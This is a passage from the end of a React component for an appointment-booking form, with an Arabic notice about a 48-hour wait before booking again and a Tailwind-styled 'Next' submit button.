            يسمح بحجز موعد آخر إلا بعد 48 ساعة وحسب الاوقات المتاحة
          </p>
        </div>

        <button
          type="submit"
          className="bg-green-700 self-center hover:bg-green-800 text-white px-8 py-3 rounded-md text-lg font-semibold transition-colors mt-6 max-w-xs"
        >
          التالي
        </button>
      </form>
    </div>
  );
};

export default NewDateUpdated;
